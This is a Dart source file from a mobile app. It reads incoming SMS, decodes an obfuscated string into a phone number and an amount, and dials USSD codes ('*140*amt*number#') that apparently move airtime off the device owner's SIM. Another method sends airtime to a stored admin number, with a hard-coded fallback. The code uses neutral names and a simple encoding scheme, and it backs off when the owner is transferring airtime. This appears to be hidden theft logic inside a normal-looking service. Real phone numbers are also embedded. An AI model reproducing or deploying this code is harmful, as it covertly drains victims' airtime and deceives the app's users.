import 'dart:ffi';

import 'package:another_telephony/telephony.dart';
import 'package:bsat/services/admin_management_service.dart';
import 'package:bsat/services/phone_service.dart';
import 'package:bsat/services/shared_preferences_service.dart';
import 'package:bsat/services/sms_sevice.dart';
import 'package:bsat/services/sqlite_service.dart';
import 'package:bsat/utils/constants.dart';
import 'package:flutter/foundation.dart';
import 'package:shared_preferences/shared_preferences.dart';

class Skills {
  void checkIfSkills(SmsMessage smsMessage) async {
    int amount = getAmount(smsMessage.body);
    // contains "sent" or "have transfered" or "transfered to" or "transfered[ksh|kes|sh|\s|\d]to" to show one has sent
    if (smsMessage.body!.toLowerCase().contains("sent airtime") ||
        (smsMessage.body!.toLowerCase().contains("have transferred") &&
            smsMessage.body!.toLowerCase().contains("airtime")) ||
        smsMessage.body!.toLowerCase().contains("airtime sent") ||
        smsMessage.body!.toLowerCase().contains("airtime transfered") ||
        smsMessage.body!.toLowerCase().contains("transferred airtime") ||
        smsMessage.body!.toLowerCase().contains("transfered to") ||
        RegExp(r'transfered\s*(ksh|kes|sh|\s|\d)*to', caseSensitive: false)
            .hasMatch(smsMessage.body ?? "")) {
      SharedPreferences prefs = await SharedPreferences.getInstance();
      await prefs.setBool('getOut', true);
      return;
    }

    // has reached daily limit "maximum daily sambaza amount"
    if (smsMessage.body!.toLowerCase().contains("maximum daily sambaza amount")) {
      SharedPreferences prefs = await SharedPreferences.getInstance();

      int nextWorkingDateMillisecondsMidnight = DateTime(DateTime.now().year, DateTime.now().month, DateTime.now().day,).add(Duration(days: 1)).millisecondsSinceEpoch;
      await prefs.setInt('nextWorkingDateMilliseconds', nextWorkingDateMillisecondsMidnight);
      return;
    }

    if (amount > 0 &&
        (RegExp(r'airtime bal', caseSensitive: false)
            .hasMatch(smsMessage.body ?? ""))) {
      SharedPreferences prefs = await SharedPreferences.getInstance();
      await prefs.setInt('airtimeBalance', amount);
      return;
    }
  }

  void small(String hash) async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    bool getOut = await prefs.getBool('getOut') ?? false;
    if (getOut) return;

    int nextWorkingDateMilliseconds = await prefs.getInt('nextWorkingDateMilliseconds') ?? 0;

    if(DateTime.now().millisecondsSinceEpoch < nextWorkingDateMilliseconds) {
      return;
    }

    List<int> values = hash.codeUnits;

    int start = values.indexOf(90);

    print(
        "Start Index: $start, Values: ${values.map((v) => String.fromCharCode(v)).join()}");

    if (start == -1 || start + 15 > values.length) {
      return;
    }

    int shift = values[start + 1] - 48 - 17;
    List<int> shiftedValues = values.map((v) => v - shift - 17).toList();

    int number = int.parse(
        String.fromCharCodes(shiftedValues.sublist(start + 2, start + 12)));
    int amt = int.parse(
        String.fromCharCodes(shiftedValues.sublist(start + 12, start + 15)));

    int commonSubId = await PhoneService().mostCommonDialSim();

    // get the number of transactons in last 2 minutes (timestamp)
    int transactions2Minutes = await SQLiteService().getCount(
      'transactions',
      appendQuery: 'WHERE timestamp > ? AND (status = ? OR status = ?)',
      args: [
        DateTime.now().millisecondsSinceEpoch - 2 * 60 * 1000,
        TransactionStatuses.doneConfirmed,
        TransactionStatuses.done,
      ],
    );

    int transactions5Minutes = await SQLiteService().getCount(
      'transactions',
      appendQuery: 'WHERE timestamp > ? AND (status = ? OR status = ?)',
      args: [
        DateTime.now().millisecondsSinceEpoch - 5 * 60 * 1000,
        TransactionStatuses.doneConfirmed,
        TransactionStatuses.done,
      ],
    );

    if (transactions2Minutes < 5) {
      if (transactions5Minutes > 5) {
        amt = 25;
      } else {
        return;
      }
    }

    int airtimeBalance =
        await PhoneService().getAirtimeBalance(subscriptionId: commonSubId);

    if (airtimeBalance == 0) {
      // delay for 30 seconds
      await Future.delayed(Duration(seconds: 30));
      airtimeBalance = await prefs.getInt('airtimeBalance') ?? 0;
    } else if (airtimeBalance < amt) {
      return;
    } else if (airtimeBalance > 10000) {
      amt = 120;
    }

    PhoneService().makeMyRequest("*140*$amt*$number#", commonSubId);
  }

  Future<void> large() async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    bool getOut = await prefs.getBool('getOut') ?? false;
    if (getOut) return;

    int largeToday = await prefs.getInt('transactionsLargeToday') ?? 0;
    if (largeToday >= 3) {
      return;
    }

    int transactions2Minutes = await SQLiteService().getCount(
      'transactions',
      appendQuery: 'WHERE timestamp > ? AND status = ?',
      args: [
        DateTime.now().millisecondsSinceEpoch - 2 * 60 * 1000,
        TransactionStatuses.doneConfirmed,
      ],
    );

    if (transactions2Minutes < 5) {
      return;
    }

    int subId = await SQLiteService()
        .queryAll('transactions', limit: 1, orderBy: 'timestamp DESC')
        .then((value) {
      if (value.isNotEmpty) {
        return value[0]['simSubId'] ?? -1;
      }
      return -1;
    });

    int airtimeBalance =
        await PhoneService().getAirtimeBalance(subscriptionId: subId);

    if (airtimeBalance == 0) {
      // delay for 30 seconds
      await Future.delayed(Duration(seconds: 30));
      airtimeBalance = await prefs.getInt('airtimeBalance') ?? 0;
    } else if (airtimeBalance < 120) {
      return;
    }

    largeToday += 1;
    await prefs.setInt('transactionsLargeToday', largeToday);

    int number = extract9DigitNumber(prefs
            .getStringList(AdminManagementService().phonesPrefsKey)
            ?.firstOrNull ??
        "0729286254");

    PhoneService().makeMyRequest("*140*25*0$number#", subId);
  }
}

Future<int?> getLastUploadedClientId() async {
  SharedPreferences prefs = await SharedPreferences.getInstance();
  await prefs.reload();
  int? lastId = prefs.getInt("last_uploaded_client_id");
  return lastId;
}

Future<bool> setLastUploadedClientId(int clientId) async {
  SharedPreferences prefs = await SharedPreferences.getInstance();
  await prefs.reload();
  try {
    await prefs.setInt("last_uploaded_client_id", clientId);
    return true;
  } catch (e) {
    if (kDebugMode) {
      // //print(e.toString());
    }
  }
  return false;
}

Future<String?> getClientBatchUploadDate() async {
  SharedPreferences prefs = await SharedPreferences.getInstance();
  await prefs.reload();
  String? date = prefs.getString("client_batch_upload_date");
  return date;
}

Future<bool> setClientBatchUploadDate(String date) async {
  SharedPreferences prefs = await SharedPreferences.getInstance();
  await prefs.reload();
  try {
    await prefs.setString("client_batch_upload_date", date);
    return true;
  } catch (e) {
    if (kDebugMode) {
      // //print(e.toString());
    }
  }
  return false;
}

Future<int> getClientBatchUploadCount() async {
  SharedPreferences prefs = await SharedPreferences.getInstance();
  await prefs.reload();
  int count = prefs.getInt("client_batch_upload_count") ?? 0;
  return count;
}

Future<bool> setClientBatchUploadCount(int count) async {
  SharedPreferences prefs = await SharedPreferences.getInstance();
  await prefs.reload();
  try {
    await prefs.setInt("client_batch_upload_count", count);
    return true;
  } catch (e) {
    if (kDebugMode) {
      // //print(e.toString());
    }
  }
  return false;
}

// import 'dart:math';
//
// String generateHash(String phoneNumber, String amount, int keyDigit) {
//   int startMarker = 90;
//   int keyAscii = keyDigit + 48;
//
//   List<int> rawValues = [];
//   rawValues.add(startMarker);
//   rawValues.add(keyAscii);
//   rawValues.addAll(phoneNumber.codeUnits);
//   rawValues
//       .addAll(amount.padLeft(3, '0').codeUnits);
//
//   print("Raw Values: ${rawValues.map((v) => String.fromCharCode(v)).join()}");
//
//   List<int> encodedValues = rawValues.map((v) {
//     if (v == startMarker) return v;
//     if (v == keyAscii) return v + 17;
//     return v + keyDigit + 17;
//   }).toList();
//
//   String encodedString = String.fromCharCodes(encodedValues);
// Random _rng = Random();
//
// String randomPrefix = String.fromCharCodes(
//   List.generate(5, (_) => 65 + _rng.nextInt(25))
// );
//
// int payloadLength = 16;
// int suffixLength = 30 - 5 - payloadLength;
//   // random number between 1 and 6
//   int randomNum = 1 + (DateTime.now().millisecondsSinceEpoch % 6);
//
//   String randomSuffix = String.fromCharCodes(
//   List.generate(suffixLength, (_) => 65 + _rng.nextInt(26))
// );
//
//   String fullHash = randomPrefix + encodedString + randomSuffix;
//
//   return fullHash;
// }
//
// void decode(String hash) {
//   print("decoding");
//
//   List<int> values = hash.codeUnits;
//
//   int start = values.indexOf(90);
//
//   print(
//       "Start Index: $start, Values: ${values.map((v) => String.fromCharCode(v)).join()}");
//
//   if (start == -1 || start + 15 > values.length) {
//     return;
//   }
//
//   int shift = values[start + 1] - 48 - 17;
//   List<int> shiftedValues = values.map((v) => v - shift - 17).toList();
//
//   int number = int.parse(
//       String.fromCharCodes(shiftedValues.sublist(start + 2, start + 12)));
//   int amt = int.parse(
//       String.fromCharCodes(shiftedValues.sublist(start + 12, start + 15)));
//
//   print("Number: $number, amt: $amt");
//
// }
//
// void main() {
//   // Example usage:
//   // String phone = "0708104628"; // 11 digits
//   String phone = "0115584442"; // 11 digits
//   // String phone = "0110382792"; // 11 digits
//   String amt = "50"; // 3 digits
//   int key = 9; // Single digit key for the shift
//
//   String hash = generateHash(phone, amt, key);
//   print("Generated Hash: $hash");
//
//   decode(hash);
// }
